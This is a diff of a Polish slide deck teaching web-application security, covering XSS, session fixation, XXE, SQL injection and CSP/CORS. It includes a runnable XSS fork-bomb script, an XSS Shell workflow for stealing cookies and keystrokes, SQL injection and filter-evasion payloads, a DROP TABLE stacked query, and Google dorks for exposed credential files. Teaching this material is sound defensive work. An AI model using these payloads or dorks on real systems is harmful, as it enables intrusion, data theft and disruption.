@@ -48,7 +48,7 @@ Ten plik został zabezpieczony w tak zwanym głębokim ukryciu, jak to mówią i
 ** Typowa web-aplikacja
 
 #+CAPTION: Typowa web-aplikacja
-#+ATTR_HTML: :align center
+#+ATTR_HTML: :align center :height 500px
 [[./images/WebApplication.png]]
 
 ** Przykładowe podatności - Spring Framework
@@ -85,10 +85,20 @@ Programiści często korzystają z online-owych narzędzi jak:
 
 Nie mając żadnej informacji komu i gdzie przekazują te informacje. 
 
+* Aspekt prawny
+
+Zabawy w niezamówione testy bezpieczeństwa mogą mieć swoje (przykre)
+prawne następstwa.
+
+- http://prawo.vagla.pl/node/8154
+- http://di.com.pl/precedensowy-wyrok-w-sprawie-sql-injection-23837
+- http://www.proline.pl/?n=haker-kontra-multimedia-dane-zle-zabezpieczone
+
 * Architektura a bezpieczeństwo
 ** Monolith
-#+CAPTION: Architektura monolitczyna
-#+ATTR_HTML: :align center
+
+#+CAPTION: Architektura monolityczna
+#+ATTR_HTML: :align center :height 500px
 [[./images/Monolith.png]]
 
 ** Single Page Application
@@ -105,122 +115,6 @@ Nie mając żadnej informacji komu i gdzie przekazują te informacje.
   użytkownika
 - Serwer wciąż nie może ufać danym przychodzącym od klientów
 
-** Content Security Policy
-- Nowy standard pozwalający zdefiniować dozwolone pochodzenie zasobów
-  (JS, CSS, obrazki, pluginy, fonty) w aplikacji webowej 
-- Mechanizm przeglądarki stworzony jako obrona przed XSS
-- Pozwala ograniczyć dozwolone destynacje dla requestów, websocketów
-  czy formularzy
-- Daje możliwoś zablokowania niechcianych elementów jak obiekty Flash czy ramki
-- Blokuje skrypty "inline" czy =eval()=
-- Powoli wspierany przez frameworki MVC (AngularJS, Ember.js) które
-  mają wbudowane tryby zgodności
-- Działa w Chrome, Firefox, Safari i częściowo w IE10 (=X-Content-Security-Policy=)
-
-#+REVEAL: split
-
-- Opiera się na nagłówkach odpowiedzi HTTP ustawianych przez serwer
-#+BEGIN_EXAMPLE
-Content-Security-Policy: script-src 'self' https://apis.google.com
-#+END_EXAMPLE
-- Oferuje mechanizm raportów powiadamiający o naruszeniach polityki
-  bezpieczeństwa
-#+BEGIN_EXAMPLE
-Content-Security-Policy: default-src 'self';  https://apis.google.com; report-uri /reportsConsumer;
-{
-  "csp-report": {
-    "document-uri": "http://mypage.org/index.html",
-    "referrer": "http://badguy.com/",
-    "blocked-uri": "http://badguy.com/malicious.js",
-    "violated-directive": "script-src 'self' https://apis.google.com",
-    "original-policy": "script-src 'self' https://apis.google.com; report-uri http://mypage.org/reportsConsumer"
-  }
-}
-#+END_EXAMPLE
-
-#+REVEAL: split
-
-- Istnieje "łagodniejsza" odmiana mechanizmu CSP - która tylko
-  raportuje nadużycia, ale ich nie blokuje
-#+BEGIN_EXAMPLE
-Content-Security-Policy-Report-Only: default-src 'self'; https://apis.google.com; report-uri /reportsConsumer;
-#+END_EXAMPLE
-
-** Cross-Origin Resource Sharing
-
-#+BEGIN_QUOTE
-Cross-origin resource sharing (w skrócie CORS) – mechanizm
-umożliwiający współdzielenie zasobów pomiędzy serwerami znajdującymi
-się w różnych domenach. Ściślej rzecz biorąc chodzi o możliwość
-wykonywania żądań AJAX między takimi serwerami przy zachowaniu pewnych
-ograniczeń co do dopuszczalnego źródła żądania.
-
--- https://pl.wikipedia.org/wiki/Cross-Origin_Resource_Sharing
-#+END_QUOTE
-
-** CORS
-- standard W3C
-- oparty o nagłówki HTTP
-- rozszerza standardowe podejście *same origin* jednocześnie
-  zapewniając niezbędny poziom bezpieczeństwa
-- definiuje sposób w jaki przeglądarka i serwer dogadują się w kwestii
-  wykonania requestów *cross origin*
-- wspierany przez praktycznie wszystkie współczesne przeglądarki
-
-** CORS - scenariusz 1
-#+BEGIN_SRC plantuml :file images/generated-cors1-scenario.png :results silent
-skinparam backgroundcolor transparent
-hide footbox
-
-participant "JavaScript\nhttp://foo.com" as foo
-participant "Web Browser" as browser
-participant "Server\nhttp://bar.com" as bar
-
-foo -> browser : POST bar.com/something
-
-group optional
-  browser -> bar : OPTIONS bar.com/something\nOrigin: http://foo.com
-  bar --> browser: Access-Control-Allow-Origin: http://foo.com\nAccess-Control-Allow-Methods: POST, PUT
-  browser -> browser: Check if ACAO header\n equals * or http://foo.com
-
-  alt successful case
-    browser -> bar : POST bar.com/something\nOrigin: http://foo.com
-    bar --> browser: Access-Control-Allow-Origin http://foo.com\nsomethingInteresting  
-    browser --> foo : somethingInteresting
-  else missing CORS headers
-    browser --> foo : Error
-  end
-end
-#+END_SRC
-
-#+CAPTION: Scenario of the CORS for POST
-#+ATTR_HTML: :align center
-[[./images/generated-cors1-scenario.png]]
-
-** CORS - scenariusz 2
-#+BEGIN_SRC plantuml :file images/generated-cors2-scenario.png :results silent
-skinparam backgroundcolor transparent
-hide footbox
-
-participant "JavaScript\nhttp://foo.com" as foo
-participant "Web Browser" as browser
-participant "Server\nhttp://bar.com" as bar
-
-foo -> browser : GET bar.com/something
-browser -> bar : GET bar.com/something\nOrigin: http://foo.com
-bar --> browser: Access-Control-Allow-Origin: http://foo.com\nsomethingInteresting 
-browser -> browser: Check in ACAO header\n equals * or http://foo.com
-
-alt successful case
-browser --> foo : somethingInteresting
-else missing CORS headers
-browser --> foo : Error
-end
-#+END_SRC
-
-#+CAPTION: Scenario of the CORS for GET
-#+ATTR_HTML: :align center
-[[./images/generated-cors2-scenario.png]]
 ** Microservices
 
 #+BEGIN_QUOTE
@@ -234,7 +128,7 @@ as suites of independently deployable services.
 ** Architektura mikroserwisów
 
 #+CAPTION: Architektura mikroserwisów
-#+ATTR_HTML: :align center :height 700px
+#+ATTR_HTML: :align center :height 500px
 [[./images/Microservices.png]]
 
 ** Bezpieczeństwo mikroserwisów
@@ -255,14 +149,6 @@ bezpieczeństwa:
   testowane pod kątem typowych podatności?
 - Czy wdrożyliśmy typowe praktyki bezpieczeństwa, polityki haseł,
   upgrade-u komponentów?
-
-* Aspekt prawny
-
-Zabawy w niezamówione testy bezpieczeństwa mogą mieć swoje (przykre) prawne następstwa.
-
-- http://prawo.vagla.pl/node/8154
-- http://di.com.pl/precedensowy-wyrok-w-sprawie-sql-injection-23837
-- http://www.proline.pl/?n=haker-kontra-multimedia-dane-zle-zabezpieczone
 
 * Google hacking
 ** Wstęp
@@ -295,7 +181,7 @@ Zabawy w niezamówione testy bezpieczeństwa mogą mieć swoje (przykre) prawne 
 ** Przykłady
 
 - intitle:index.of -inurl:index.php Metallica
-- inurl: SELECT inurl:FROM inurl:WHERE
+- inurl:SELECT inurl:FROM inurl:WHERE
 - filetype:bak site:www.example.com mysql warning
 - filetype:bak inurl:"htaccess|passwd|shadow|htusers"
 - http://admin:*@www 
@@ -314,6 +200,7 @@ Zabawy w niezamówione testy bezpieczeństwa mogą mieć swoje (przykre) prawne 
 - intitle:phpMyAdmin "Welcome to phpMyAdmin" "running on * as root@"
 - intitle:phpMyAdmin "Welcome to phpMyAdmin ***" "running on * as *"
 - intitle:Tomcat Status | inurl:/status?full=true
+- inurl:jmx-console
 
 ** Przykłady: kamerki, drukarki, switche
 - inurl:”ViewerFrame?Mode=”
@@ -419,13 +306,13 @@ end
 #+END_SRC
 
 #+CAPTION: Scenario of the Reflected XSS attack
-#+ATTR_HTML: :align center
+#+ATTR_HTML: :align center :height 500px
 [[./images/generated-reflectedxss-scenario.png]]
 
 ** Stored XSS
 
-Mówimy o *Stored XSS* gdy złośliwie wstrzyknięty kod jest przechowywany i serwowany
-użytkownikom przez samą aplikację.
+Mówimy o *Stored XSS* gdy złośliwie wstrzyknięty kod jest
+przechowywany i serwowany użytkownikom przez samą aplikację.
 
 Przykład: Atakujący użył formularza dodawania komentarzy by wstrzyknąć
 i zapisać swój kod, który potem zostanie wysłany do pozostałych
@@ -467,7 +354,7 @@ end
 #+END_SRC
 
 #+CAPTION: Scenario of the Stored XSS attack
-#+ATTR_HTML: :align center
+#+ATTR_HTML: :align center :height 500px
 [[./images/generated-storedxss-scenario.png]]
 
 ** DOM Based XSS
@@ -476,10 +363,10 @@ Ta odmiana XSS wykorzystuje podatności w kodzie po stronie klienta
 (przeglądarki) w odróżnieniu od Reflected XSS i Stored XSS które
 traktujemy jako problemy po stronie serwera.
 
-W swoim działaniu jest podobny do Reflected XSS z tą
-różnicą, że złośliwy kod nie jest przetwarzany przez serwer a jedynie
-odsyłany do przeglądarki (często nie jest wysyłany do
-serwera). Zapobieganie tym atakom odbywa się głównie w kodzie JavaScript.
+W swoim działaniu jest podobny do Reflected XSS z tą różnicą, że
+złośliwy kod nie jest przetwarzany przez serwer a jedynie odsyłany do
+przeglądarki (często nie jest wysyłany do serwera). Zapobieganie tym
+atakom odbywa się głównie w kodzie JavaScript.
 
 ** DOM Based XSS - scenariusz
 
@@ -506,16 +393,42 @@ end
 #+END_SRC
 
 #+CAPTION: Scenario of the DOM based XSS attack
-#+ATTR_HTML: :align center
+#+ATTR_HTML: :align center :height 500px
 [[./images/generated-domxss-scenario.png]]
+
+** XSS Fork Bomb
+#+BEGIN_SRC js
+<script>
+while (true) {
+  var w = window.open();
+  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+}
+</script>
+#+END_SRC
+
+#+BEGIN_SRC js
+<a href="#" onload="function() { while (true) { var w = window.open(); w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML); } }">XSS fork bomb</a>
+#+END_SRC
+
+** XSS Shell
+Przejęcie komputera za pomocą XSS-a?
+
+- Instalujemy XSS Shell na naszym serwerze
+  (https://github.com/portcullislabs/xssshell-xsstunnell)
+- Wstrzykujemy skrypt inicjujący XSS Shell na atakowanej stronie
+- Czekamy kiedy ofiary pojawią się online i wykonujemy akcje: 
+  - Pokaż alert
+  - Pokaż cookie
+  - Keylogger
+  - Zawartość schowka (IE)
 
 ** XSS - zapobieganie
 
 - Filtry HTTP które blokują przetwarzanie requestów zawierających
   potencjalne wstrzyknięcia
 - Escape-owanie znaków html ( "<" na &lt; itd) - =ESAPI.encoder()=
-- Parsery/filtry/sanitizer-y(?) HTML które potrafią przepuścić wybrane zakres
-  znaczników i ich atrybutów
+- Parsery/filtry/sanitizer-y(?) HTML które potrafią przepuścić wybrane
+  zakres znaczników i ich atrybutów
   - https://github.com/owasp/java-html-sanitizer
   - https://github.com/finn-no/xss-html-filter
   - https://github.com/Vereyon/HtmlRuleSanitizer
@@ -554,30 +467,137 @@ cookie.setHttpOnly(true);
 </session-config>
 #+END_SRC
 
-** XSS Fork Bomb
-#+BEGIN_SRC js
-<script>
-while (true) {
-  var w = window.open();
-  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+** Content Security Policy
+- Nowy standard pozwalający zdefiniować dozwolone pochodzenie zasobów
+  (JS, CSS, obrazki, pluginy, fonty) w aplikacji webowej
+- Mechanizm przeglądarki stworzony jako obrona przed XSS
+- Pozwala ograniczyć dozwolone destynacje dla requestów, websocketów
+  czy formularzy
+- Daje możliwoś zablokowania niechcianych elementów jak obiekty Flash
+  czy ramki
+- Blokuje skrypty "inline" czy =eval()=
+- Powoli wspierany przez frameworki MVC (AngularJS, Ember.js) które
+  mają wbudowane tryby zgodności
+- Działa w Chrome, Firefox, Safari i częściowo w IE10
+  (=X-Content-Security-Policy=). Warto sprawdzić wsparcie w różnych
+  przeglądarkach (http://caniuse.com/#search=CSP)
+
+#+REVEAL: split
+
+- Opiera się na nagłówkach odpowiedzi HTTP ustawianych przez serwer
+- Zasada działania to w skrócie: "blokuj wszystko, oprócz podanych
+  wyjątków"
+
+#+BEGIN_EXAMPLE
+Content-Security-Policy: script-src 'self' https://apis.google.com
+#+END_EXAMPLE
+
+- Oferuje mechanizm raportów powiadamiający o naruszeniach polityki
+  bezpieczeństwa
+#+BEGIN_EXAMPLE
+Content-Security-Policy: default-src 'self';  https://apis.google.com; report-uri /reportsConsumer;
+{
+  "csp-report": {
+    "document-uri": "http://mypage.org/index.html",
+    "referrer": "http://badguy.com/",
+    "blocked-uri": "http://badguy.com/malicious.js",
+    "violated-directive": "script-src 'self' https://apis.google.com",
+    "original-policy": "script-src 'self' https://apis.google.com; report-uri http://mypage.org/reportsConsumer"
+  }
 }
-</script>
+#+END_EXAMPLE
+
+#+REVEAL: split
+
+- Istnieje "łagodniejsza" odmiana mechanizmu CSP - która tylko
+  raportuje nadużycia, ale ich nie blokuje
+#+BEGIN_EXAMPLE
+Content-Security-Policy-Report-Only: default-src 'self'; https://apis.google.com; report-uri /reportsConsumer;
+#+END_EXAMPLE
+
+#+REVEAL: split
+
+- Aktywnie rozwijany:
+  - 1.0 :: 2015-02-19 - https://www.w3.org/TR/2015/NOTE-CSP1-20150219/
+  - 2.0 :: 2015-07-21 - https://www.w3.org/TR/CSP2/ (obecnie
+           rekomendowana)
+  - 3.0 (draft) :: https://w3c.github.io/webappsec-csp/
+
+** Cross-Origin Resource Sharing
+
+#+BEGIN_QUOTE
+Cross-origin resource sharing (w skrócie CORS) – mechanizm
+umożliwiający współdzielenie zasobów pomiędzy serwerami znajdującymi
+się w różnych domenach. Ściślej rzecz biorąc chodzi o możliwość
+wykonywania żądań AJAX między takimi serwerami przy zachowaniu pewnych
+ograniczeń co do dopuszczalnego źródła żądania.
+
+-- https://pl.wikipedia.org/wiki/Cross-Origin_Resource_Sharing
+#+END_QUOTE
+
+** CORS
+- standard W3C
+- oparty o nagłówki HTTP
+- rozszerza standardowe podejście *same origin* jednocześnie
+  zapewniając niezbędny poziom bezpieczeństwa
+- definiuje sposób w jaki przeglądarka i serwer dogadują się w kwestii
+  wykonania requestów *cross origin*
+- wspierany przez praktycznie wszystkie współczesne przeglądarki
+
+** CORS - scenariusz 1
+#+BEGIN_SRC plantuml :file images/generated-cors1-scenario.png :results silent
+skinparam backgroundcolor transparent
+hide footbox
+
+participant "JavaScript\nhttp://foo.com" as foo
+participant "Web Browser" as browser
+participant "Server\nhttp://bar.com" as bar
+
+foo -> browser : POST bar.com/something
+
+group optional
+  browser -> bar : OPTIONS bar.com/something\nOrigin: http://foo.com
+  bar --> browser: Access-Control-Allow-Origin: http://foo.com\nAccess-Control-Allow-Methods: POST, PUT
+  browser -> browser: Check if ACAO header\n equals * or http://foo.com
+
+  alt successful case
+    browser -> bar : POST bar.com/something\nOrigin: http://foo.com
+    bar --> browser: Access-Control-Allow-Origin http://foo.com\nsomethingInteresting  
+    browser --> foo : somethingInteresting
+  else missing CORS headers
+    browser --> foo : Error
+  end
+end
 #+END_SRC
 
-#+BEGIN_SRC js
-<a href="#" onload="function() { while (true) { var w = window.open(); w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML); } }">XSS fork bomb</a>
+#+CAPTION: Scenario of the CORS for POST
+#+ATTR_HTML: :align center :height 500px
+[[./images/generated-cors1-scenario.png]]
+
+** CORS - scenariusz 2
+#+BEGIN_SRC plantuml :file images/generated-cors2-scenario.png :results silent
+skinparam backgroundcolor transparent
+hide footbox
+
+participant "JavaScript\nhttp://foo.com" as foo
+participant "Web Browser" as browser
+participant "Server\nhttp://bar.com" as bar
+
+foo -> browser : GET bar.com/something
+browser -> bar : GET bar.com/something\nOrigin: http://foo.com
+bar --> browser: Access-Control-Allow-Origin: http://foo.com\nsomethingInteresting 
+browser -> browser: Check if ACAO header\n equals * or http://foo.com
+
+alt successful case
+browser --> foo : somethingInteresting
+else missing CORS headers
+browser --> foo : Error
+end
 #+END_SRC
 
-** XSS Shell
-Przejęcie komputera za pomocą XSS-a?
-
-- Instalujemy XSS Shell na naszym serwerze (https://github.com/portcullislabs/xssshell-xsstunnell)
-- Wstrzykujemy skrypt inicjujący XSS Shell na atakowanej stronie
-- Czekamy kiedy ofiary pojawią się online i wykonujemy akcje: 
-  - Pokaż alert
-  - Pokaż cookie
-  - Keylogger
-  - Zawartość schowka (IE)
+#+CAPTION: Scenario of the CORS for GET
+#+ATTR_HTML: :align center :height 500px
+[[./images/generated-cors2-scenario.png]]
 
 * Ataki na sesje
 ** Session Prediction
@@ -609,9 +629,9 @@ ataku:
 - Man in the browser (Trojany dla przeglądarek)
 
 ** Session Fixation
-*Session Fixation* to wykorzystanie  podatności mechanizmu zarządzania
-sesjami, który nie zmienia identyfikatora sesji przy rozpoczęciu nowej sesji
-(np. po prawidłowym logowaniu się do systemu) a korzysta z już
+*Session Fixation* to wykorzystanie podatności mechanizmu zarządzania
+sesjami, który nie zmienia identyfikatora sesji przy rozpoczęciu nowej
+sesji (np. po prawidłowym logowaniu się do systemu) a korzysta z już
 istniejącego.
 
 Atak ten można przeprowadzić na kilka sposób:
@@ -632,10 +652,10 @@ participant "Aplikacja\nwebowa" as App
 
 Bob -> App : Loguje się\nhttp://www.example.com/login
 activate App
-App --> Bob: JESSIONID=xyz
+App --> Bob: JSESSIONID=xyz
 deactivate App
    
-Bob -> John : Email z przygotowanym linkiem\nhttp://www.example.com/login?JSESSIONID=xyz
+Bob -> John : Email z przygotowanym linkiem\nhttp://www.example.com/login?jsessionid=xyz
 John -> App : Loguje się używając\nadresu z email-a
 activate App
 App->App : Zaloguj użytkownika
@@ -652,7 +672,7 @@ Bob -> App: Pracuje w kontekście przejętej sesji
 #+END_SRC
 
 #+CAPTION: Scenario of Session Fixation attack
-#+ATTR_HTML: :align center
+#+ATTR_HTML: :align center :height 500px
 [[./images/generated-session-fixation-scenario.png]]
 
 * Ataki związane z przetwarzaniem XML
@@ -660,7 +680,7 @@ Bob -> App: Pracuje w kontekście przejętej sesji
 
 Atak *XML XXE* to atak ukierunkowany na parsery XML które
 przetwarzając dokument akceptują nawiązania do zewnętrznych elementów
-w DTD (domyślna konfiguracja wielu parserów). 
+w DTD (domyślna konfiguracja wielu parserów).
 
 #+BEGIN_SRC xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -679,7 +699,7 @@ w DTD (domyślna konfiguracja wielu parserów).
 - atak na zewnętrzny serwer
 - atak DOS:
   - duży plik na innym serwerze
-  - =/dev/urandom/=
+  - =/dev/urandom=
   - rekurencyjna definicja elementów
 
 ** XML XEE - Przesłanie danych
@@ -756,9 +776,9 @@ https://docs.python.org/2.7/library/xml.html#xml-vulnerabilities
 ** Ataki XML - zapobieganie
 
 Na ataki XMLem podatne są parsery dla praktycznie wszystkich języków
-(Java, .NET, Python, PHP, platformy mobilne itd.), jednakże wiele z nich można
-skonfigurować tak by nie rozwiązywała zewnętrznych elementów bądź
-zagnieżdżonych definicji w DTD.
+(Java, .NET, Python, PHP, platformy mobilne itd.), jednakże wiele z
+nich można skonfigurować tak by nie rozwiązywała zewnętrznych
+elementów bądź zagnieżdżonych definicji w DTD.
 
 Można też całkowicie pozbyć się DTD zanim dokument XML zostanie
 przekazany do parsera.
@@ -805,7 +825,7 @@ użytkowników w ten sposób:
 
 #+BEGIN_SRC java
 String sql = "SELECT userId FROM users WHERE login='" + 
-             login + "' AND password='" + pass + '";
+             login + "' AND password='" + pass + "'";
 #+END_SRC
 
 to wysyłając parametry:
@@ -831,42 +851,42 @@ SELECT userId FROM users WHERE login='admin'-- AND password='cokolwiek'
 ** Scenariusz
 #+BEGIN_SRC plantuml :file images/generated-sql-scenario.png :results silent
 skinparam backgroundcolor transparent
-  actor "Zły człowiek" as Bob #red
-  participant "Aplikacja webowa" as App
-   
-  loop Szukanie podatności
-    Bob -> App : Request 1
-    ... ...
-    Bob -> App : Request n
-  end
-   
-  loop Poznanie struktury zapytania
-      Bob -> App : Request 1
-    ... ...
-    Bob -> App : Request n
-  end
-   
-  loop Odkrycie rodzaju bazy danych
-     Bob -> App : Request 1
-    ... ...
-    Bob -> App : Request n
-  end
-   
-  loop Poznanie struktury bazy
-      Bob -> App : Request 1
-    ... ...
-    Bob -> App : Request n
-  end
-   
-  loop Wykonywanie własnych zapytań
-      Bob -> App : Request 1
-    ... ...
-    Bob -> App : Request n
-  end
+actor "Zły człowiek" as Bob #red
+participant "Aplikacja webowa" as App
+ 
+loop Szukanie podatności
+  Bob -> App : Request 1
+  ... ...
+  Bob -> App : Request n
+end
+ 
+loop Poznanie struktury zapytania
+  Bob -> App : Request 1
+  ... ...
+  Bob -> App : Request n
+end
+ 
+loop Odkrycie rodzaju bazy danych
+  Bob -> App : Request 1
+  ... ...
+  Bob -> App : Request n
+end
+ 
+loop Poznanie struktury bazy
+  Bob -> App : Request 1
+  ... ...
+  Bob -> App : Request n
+end
+ 
+loop Wykonywanie własnych zapytań
+  Bob -> App : Request 1
+  ... ...
+  Bob -> App : Request n
+end
 #+END_SRC
 
 #+CAPTION: Scenario of the SQL Injection attack
-#+ATTR_HTML: :align center :height 700px
+#+ATTR_HTML: :align center :height 500px
 [[./images/generated-sql-scenario.png]]
 
 ** Szukanie podatności - string
@@ -1016,13 +1036,13 @@ Mając hashe haseł potrzebujemy poznać hasła na podstawie których
 zostały utworzone:
 
 MD5, SHA1 z użyciem GPU: 
-http://bvernoux.free.fr/md5/index.php
-http://www.elcomsoft.com/lhc.html
+- http://bvernoux.free.fr/md5/index.php
+- http://www.elcomsoft.com/lhc.html
 
 Hasła systemowe, bazy danych
-http://www.openwall.com/john/
-https://hashkiller.co.uk/default.aspx
-http://www.md5online.org/
+- http://www.openwall.com/john/
+- https://hashkiller.co.uk/default.aspx
+- http://www.md5online.org/
 
 ** Hashkiller.co.uk - statystyki
 
@@ -1094,17 +1114,18 @@ Cluster 25 Radeonów ma przepustowość na sekundę:
 
 ** Modyfikowanie danych (stacked queries)
 
-Duża część dokumentacji na temat SQLi pokazuje przykłady gdzie wstrzyknięty
-kod dopełnia główne zapytanie ale także dodaje kolejne zapytania, z
-reguły modyfikujące dane lub bazę:
+Duża część dokumentacji na temat SQLi pokazuje przykłady gdzie
+wstrzyknięty kod dopełnia główne zapytanie ale także dodaje kolejne
+zapytania, z reguły modyfikujące dane lub bazę:
 
 #+BEGIN_SRC sql
  SELECT * FROM users WHERE login = 'x'; DROP TABLE users; SELECT '1'
 #+END_SRC
 
 Obecnie większość bibliotek do obsługi baz danych nie pozwala by w
-ramach zapytania zostały wykonane dodatkowe zapytania a w szczególności o
-różnym typie. Stąd ten atak wydaje się być bardziej teoretyczny niż praktyczny
+ramach zapytania zostały wykonane dodatkowe zapytania a w
+szczególności o różnym typie. Stąd ten atak wydaje się być bardziej
+teoretyczny niż praktyczny
 
 ** Blind SQL Injection
 Czasami mamy do czynienia z sytuacją, że wynik zapytania nie jest
@@ -1119,9 +1140,9 @@ Przykłady:
    komunikat („Masz nieprzeczytane wiadomości”)
 2. Aplikacja oczekuje, że zapytanie zwróci dokładnie jeden wiersz i go
    wyświetla, a nie mamy możliwości wpłynięcia na ten wiersz
-3. Podatność w jest podzapytaniu przy operatorze =EXISTS/NOT EXISTS=
-4. Aplikacja na podstawie zapytania wykonuje określoną akcję (np loguje), ale nie
-   zwraca wyników bezpośrednio do widoku
+3. Podatność jest w podzapytaniu przy operatorze =EXISTS/NOT EXISTS=
+4. Aplikacja na podstawie zapytania wykonuje określoną akcję (np
+   loguje), ale nie zwraca wyników bezpośrednio do widoku
 
 ** Blind SQL Injection
 Możemy też spotkać przypadek, gdzie zapytanie do którego są przekazane
@@ -1179,7 +1200,7 @@ Jeśli aplikacja buduje dowolne zapytanie z wykorzystaniem loginu:
 #+BEGIN_SRC sql
  SELECT * 
    FROM orders 
-  WHERE user_id='$userLogin‘
+  WHERE user_id='$userLogin'
 #+END_SRC
 
 To atakujący zobaczy więcej niż powinien.
@@ -1189,49 +1210,112 @@ To atakujący zobaczy więcej niż powinien.
 Jaki będzie wynik?
 
 #+BEGIN_SRC sql
-SELECT 'a'  = 'a'   t1, 
-       'a'  = 'A'   t2, 
-       'a'  = 'a '  t3, 
-       'a ' = 'a'   t4,
-       'a ' = 'a '  t5,
-       ' a' = 'a'   t6,
-       'a'  = ' a'  t7,
-       ' a' = ' a'  t8, 
-       'a'  = ' a ' t9;
+SELECT 'a'  = 'a'      t1, 
+       'a'  = 'A'      t2, 
+       'a'  = 'a '     t3, 
+       'a'  = 'A '     t4, 
+       'a ' = 'a'      t5,
+       'a ' = 'a     ' t6,
+       ' a' = 'a'      t7,
+       'a'  = ' a'     t8,
+       'a'  = ' a '    t9;
 #+END_SRC
 
 ** Porównywanie łańcuchów - MySQL - odpowiedź
+
+#+BEGIN_SRC sql
+SELECT 'a'  = 'a'      t1, 
+       'a'  = 'A'      t2, 
+       'a'  = 'a '     t3, 
+       'a'  = 'A '     t4, 
+       'a ' = 'a'      t5,
+       'a ' = 'a     ' t6,
+       ' a' = 'a'      t7,
+       'a'  = ' a'     t8,
+       'a'  = ' a '    t9;
+#+END_SRC
 
 #+BEGIN_EXAMPLE
 +----+----+----+----+----+----+----+----+----+
 | t1 | t2 | t3 | t4 | t5 | t6 | t7 | t8 | t9 |
 +----+----+----+----+----+----+----+----+----+
-|  1 |  1 |  1 |  1 |  1 |  0 |  0 |  1 |  0 |
+|  1 |  1 |  1 |  1 |  1 |  1 |  0 |  0 |  0 |
++----+----+----+----+----+----+----+----+----+
+#+END_EXAMPLE
+
+** Porównywanie łańcuchów - PostgreSQL
+
+Jaki będzie wynik?
+
+#+BEGIN_SRC sql
+SELECT 'a'  = 'a'      t1, 
+       'a'  = 'A'      t2, 
+       'a'  = 'a '     t3, 
+       'a'  = 'A '     t4, 
+       'a ' = 'a'      t5,
+       'a ' = 'a     ' t6,
+       ' a' = 'a'      t7,
+       'a'  = ' a'     t8,
+       'a'  = ' a '    t9;
+#+END_SRC
+
+** Porównywanie łańcuchów - PostgreSQL - odpowiedź
+
+#+BEGIN_SRC sql
+SELECT 'a'  = 'a'      t1, 
+       'a'  = 'A'      t2, 
+       'a'  = 'a '     t3, 
+       'a'  = 'A '     t4, 
+       'a ' = 'a'      t5,
+       'a ' = 'a     ' t6,
+       ' a' = 'a'      t7,
+       'a'  = ' a'     t8,
+       'a'  = ' a '    t9;
+#+END_SRC
+
+#+BEGIN_EXAMPLE
++----+----+----+----+----+----+----+----+----+
+| t1 | t2 | t3 | t4 | t5 | t6 | t7 | t8 | t9 |
++----+----+----+----+----+----+----+----+----+
+|  1 |  0 |  0 |  0 |  0 |  0 |  0 |  0 |  0 |
 +----+----+----+----+----+----+----+----+----+
 #+END_EXAMPLE
 
 ** Porównywanie łańcuchów - Oracle
 
 #+BEGIN_SRC sql
-SELECT CASE WHEN 'a'  = 'a'   THEN 1 ELSE 0 END t1, 
-       CASE WHEN 'a'  = 'A'   THEN 1 ELSE 0 END t2, 
-       CASE WHEN 'a'  = 'a '  THEN 1 ELSE 0 END t3, 
-       CASE WHEN 'a ' = 'a'   THEN 1 ELSE 0 END t4,
-       CASE WHEN 'a ' = 'a '  THEN 1 ELSE 0 END t5,
-       CASE WHEN ' a' = 'a'   THEN 1 ELSE 0 END t6,
-       CASE WHEN 'a'  = ' a'  THEN 1 ELSE 0 END t7,
-       CASE WHEN ' a' = ' a'  THEN 1 ELSE 0 END t8, 
-       CASE WHEN 'a'  = ' a ' THEN 1 ELSE 0 END t9
+SELECT CASE WHEN 'a'  = 'a'      THEN 1 ELSE 0 END t1, 
+       CASE WHEN 'a'  = 'A'      THEN 1 ELSE 0 END t2, 
+       CASE WHEN 'a'  = 'a '     THEN 1 ELSE 0 END t3, 
+       CASE WHEN 'a'  = 'A '     THEN 1 ELSE 0 END t4,
+       CASE WHEN 'a ' = 'a'      THEN 1 ELSE 0 END t5,
+       CASE WHEN 'a ' = 'a     ' THEN 1 ELSE 0 END t6,
+       CASE WHEN ' a' = 'a'      THEN 1 ELSE 0 END t7,
+       CASE WHEN 'a'  = ' a'     THEN 1 ELSE 0 END t8, 
+       CASE WHEN 'a'  = ' a '    THEN 1 ELSE 0 END t9
   FROM dual
 #+END_SRC
 
 ** Porównywanie łańcuchów - Oracle - odpowiedź
 
+#+BEGIN_SRC sql
+SELECT CASE WHEN 'a'  = 'a'      THEN 1 ELSE 0 END t1, 
+       CASE WHEN 'a'  = 'A'      THEN 1 ELSE 0 END t2, 
+       CASE WHEN 'a'  = 'a '     THEN 1 ELSE 0 END t3, 
+       CASE WHEN 'a'  = 'A '     THEN 1 ELSE 0 END t4,
+       CASE WHEN 'a ' = 'a'      THEN 1 ELSE 0 END t5,
+       CASE WHEN 'a ' = 'a     ' THEN 1 ELSE 0 END t6,
+       CASE WHEN ' a' = 'a'      THEN 1 ELSE 0 END t7,
+       CASE WHEN 'a'  = ' a'     THEN 1 ELSE 0 END t8, 
+       CASE WHEN 'a'  = ' a '    THEN 1 ELSE 0 END t9
+  FROM dual
+#+END_SRC
+
 #+BEGIN_EXAMPLE
 +----+----+----+----+----+----+----+----+----+
 | T1 | T2 | T3 | T4 | T5 | T6 | T7 | T8 | T9 |
 |----+----+----+----+----+----+----+----+----|
-|  1 |  0 |  1 |  1 |  1 |  0 |  0 |  1 |  0 |
+|  1 |  0 |  1 |  0 |  1 |  1 |  0 |  0 |  0 |
 +----+----+----+----+----+----+----+----+----+
 #+END_EXAMPLE
 
@@ -1239,11 +1323,13 @@ SELECT CASE WHEN 'a'  = 'a'   THEN 1 ELSE 0 END t1,
 Często programiści piszą swoje własne, "domowe" sposoby zapobiegania
 SQLi. Dużą cześć można łatwo obejść:
 
+#+BEGIN_EXAMPLE
 - ?id=-1/**/union/**/select/**/…
 - ?id=-1/*ab*/union/*cd*/select/*ef*/…
-- ?id=-1 union … where login = char 77,121,83,81,76)
+- ?id=-1 union … where login = char (77,121,83,81,76)
 - ?id=-1 union … where login = concat (char(77), char(121))
 - (mysql) ?id=-1 union … where login = 0×414243
+#+END_EXAMPLE
   
 ** Omijanie filtrów - Apache mod_security
 #+BEGIN_EXAMPLE
@@ -1323,7 +1409,8 @@ SDOS wzmacnia działanie, chociaż czasami może wystarczyć pojedyncze
 zapytanie. SDOS może zostać przeprowadzony w oparciu o:
 
